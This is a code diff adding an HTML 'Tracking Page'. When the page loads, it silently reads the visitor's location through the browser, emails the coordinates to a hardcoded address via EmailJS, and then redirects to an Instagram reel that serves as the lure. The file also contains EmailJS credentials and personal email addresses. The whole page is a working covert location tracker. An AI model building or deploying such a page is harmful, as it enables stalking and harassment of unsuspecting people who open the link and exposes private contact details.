@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tracking Page</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+   
+    <script>
+        // Initialize EmailJS
+        (function(){
+            emailjs.init("FgynicDDuERe6rISX");  // Replace with your EmailJS User ID
+            console.log("EmailJS initialized");
+        })();
+
+        // Function to send email
+        function sendEmail(latitude, longitude) {
+            let templateParams = {
+                to_email: "appash1999@gmail.com", // Replace with your email
+                lat: latitude,
+                lon: longitude,
+                from_name: "Tracking System",
+                from_email: "p.appash047@gmail.com"
+            };
+
+            console.log("Sending email with the following details:", templateParams);
+
+            emailjs.send("service_6mdzbfj", "template_neg65fj", templateParams)
+                .then(response => {
+                    console.log("Email sent successfully!", response);
+
+                    // After email is sent, redirect to Instagram reel
+                    window.location.href = "https://www.instagram.com/reel/DFf3OlWzXKT/?utm_source=ig_web_copy_link"; // Replace with your reel link
+                })
+                .catch(error => {
+                    console.log("Error sending email:", error);
+                });
+        }
+
+        // Get User Location
+        function getLocation() {
+            console.log("Getting user location...");
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    console.log(`Latitude: ${lat}, Longitude: ${lon}`);
+
+                    // Send Email with Location
+                    sendEmail(lat, lon);
+                }, error => {
+                    console.log("Error getting location:", error);
+                });
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Call function on page load
+        window.onload = () => {
+            console.log("Page loaded, calling getLocation...");
+            getLocation();
+        };
+    </script>
+</body>
+</html>
